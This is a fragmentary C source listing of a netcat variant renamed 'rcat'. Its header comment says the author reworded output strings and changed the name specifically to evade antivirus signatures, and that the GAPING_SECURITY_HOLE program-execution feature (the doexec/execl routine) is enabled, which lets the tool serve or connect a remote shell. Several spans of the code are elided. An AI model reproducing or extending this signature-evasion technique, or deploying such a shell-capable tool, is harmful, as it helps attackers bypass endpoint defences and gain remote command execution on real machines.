...
/* Modifications by Knull (knull@leethack.info) -

Compile with MingW32 as: gcc netcat.c -o rcat.exe -lws2_32

Changed words here and there (particularly in output functions) to fool antivirus signatures. 
also changed name to 'rcat' (in keeping with the AV signature bypass). Original comments left 
intact. GAPING_SECURITY_HOLE enabled.

Information regarding this release can be found at http://leethack.info
...
static char wrote_txt[] = " snt %d, rcvd %d";
...
Debug (("fl returns %d", x))
      return (x);
    }
    p++;
  } /* for */
Debug (("fl returns all: %d", siz))
  return (siz);
} /* findline */
...
#endif
    holler ("dns: %s %s", poop->name, hp->h_name);
    return (1);
  }
  return (0);
...
/* XXX: h_errno only if BIND?  look up how telnet deals with this */
      bail ("%s: lukup prob: err %d", name, h_errno);
...
/* do inverse lookups in separate loop based on our collected forward addrs,
   since gethostby* tends to crap into the same buffer over and over */
	...
	holler ("warn: reverse hst chk phailed %s: h_errno %d",
...
/* numeric or not, failure to look up a PTR is *not* considered fatal */
    if (! hostent)
	holler ("%s: reverse hst chk phailed: h_errno %d", name, h_errno);
    else {
	strncpy (poop->name, hostent->h_name, MAXHOSTNAMELEN - 2);
	hostent = gethostbyname (poop->name);
	if ((! hostent) || (! hostent->h_addr_list[0]))
	  holler ("warn: hst chk phailed for %s: h_errno %d",
		poop->name, h_errno);
	else
	  (void) comparehosts (poop, hostent);
    } /* if hostent */
...
/* case 1: reverse-lookup of a number; placed first since this case is much
  ...
  if (pnum) {
    ...
    if (servent) {
      ...
      if (x != y)			/* "never happen" */
	holler ("Warn: port-num prob, %d != %d", x, y);
  ...
  USHORT hi;
{
  ...
  if (! block)
    bail ("ldports: no block");
  if ((! lo) || (! hi))
    bail ("ldports: values %d, %d ?", lo, hi);
  x = hi;
  while (lo <= x) {
    block[x] = 1;
    x--;
  ...
  int fd;
{
  ...
  if (p)
    ...
    p = pr00gie;
Debug (("exe'ing %s as %s...", pr00gie, p))
  execl (pr00gie, p, NULL);
  bail ("exe'ing %s failed", pr00gie);	/* this gets sent out.  Hmm... */
} /* doexec */
#endif
...
/* try a few times for the local bind, a la ftp-data-port... */
	...
	holler ("rtry local %s:%d", inet_ntoa (lclend->sin_addr), lp);
	sleep (1);
...
/* calculate length of whole option mess, which is (3 + [hops] + [final] + 1),
   and apply it [have to do this every time through, of course] */
    ...
    if (rr == -1)
      bail ("srcrt setsockopt fscked");
#else /* IP_OPTIONS */
    holler ("src routing not on this boxen");
#endif /* IP_OPTIONS*/
  } /* if gatesidx */
...
/* I can't believe I have to do all this to get my own goddamn bound address
  ...
  if (o_verbose) {
    ...
    rr = getsockname (nnetfd, (SA *) lclend, &x);
      if (rr < 0)
	holler ("lcl getsockname phail");
    strcpy (bigbuf_net, "lstn on [");	/* buffer reuse... */
...
Debug (("dolstn/rcv = %d, ntbf %s ", rr, bigbuf_net))
    } else
...
/* now check out who it is.  We don't care about mismatched DNS names here,
  ...
  if (rp)
    if (z != rp)
      x = 1;
  if (x)					/* guilty! */
	bail ("cant conn to [%s] from %s [%s] %d",
...
Debug (("gotz %d frm net err %d", rr, errno))
    } /* net:ding */
...
/* sanity check.  Works because they're both unsigned... */
	...
	holler ("weird ptrs: %d, %d", rzleft, rnleft);
	rzleft = rnleft = 0;
    }
/* net write retries sometimes happen on UDP connections */
    if (! wretry) {			/* is something hung? */
	holler ("loadsa out retrs");
	return (1);
    }
    if (rnleft) {
...
Debug (("wrt %d to stdout err %d", rr, errno))
    } /* rnleft */
    if (rzleft) {
...
Debug (("wrt %d net err %d", rr, errno))
    } /* rzleft */
...
/* Debug (("in go: x now %c, optarg %x optind %d", x, optarg, optind)) */
	...
	if ((x) && (x == (x & 0x1c)))	/* mask off bits of fukt values */
	  ...
	  bail ("sort yer hop pointer? %d make mult of 4 < 29", x);
	break;
      case 'g':				/* srcroute hop[s] */
	if (gatesidx > 8)
	  bail ("loadsa -g hops no good");
...
/* everything from here down is treated as as ports and/or ranges thereof, so
  ...
  while (argv[optind]) {
	...
	curport = nextport (randports);
      ...
      curport = loport;
Debug (("singl %d, crport %d", Single, curport))
...
Debug (("ntfd %d from port %d to port %d", netfd, ourport, curport))
      if (netfd > 0)
...
int helpme()
{
  o_verbose = 1;
  holler ("rcat\n\
conn outbound:	rcat [-options] hostname port[s]... \n\
listen inbound:	rcat -l -p port [options] [hostname] [port]\n\
options:");
  holler ("\
	-d		detach, bg mode\n");
...
#endif
  holler ("\
	-g gw	src-routing hop pnt[s], up to 8\n\
	-G num		src-routing ptr: 4, 8, 12, ..\n\
	-h		halp\n\
	-i secs		delay intrval\n\
	-l		listen inbound conns\n\
	-L		listen harder on sock close\n\
	-n		numeric-only ip's\n\
	-o file		hex dump of traffic\n\
	-p port		local port number\n\
	-r		random local and re-mote ports\n\
	-s addr		local src addr");
#ifdef TELNET
  holler ("\
  ...
  holler ("\
	...
	-v		verbose\n\
	-vv		more verbose\n\
	-w seconds		tmeout for conns, final net reads\n\
	-z		zero i/o mode");
  bail ("port nums can be individ or a range: m-n [inclusive]");
  return(0);
} /* helpme */
#endif /* HAVE_HELP */
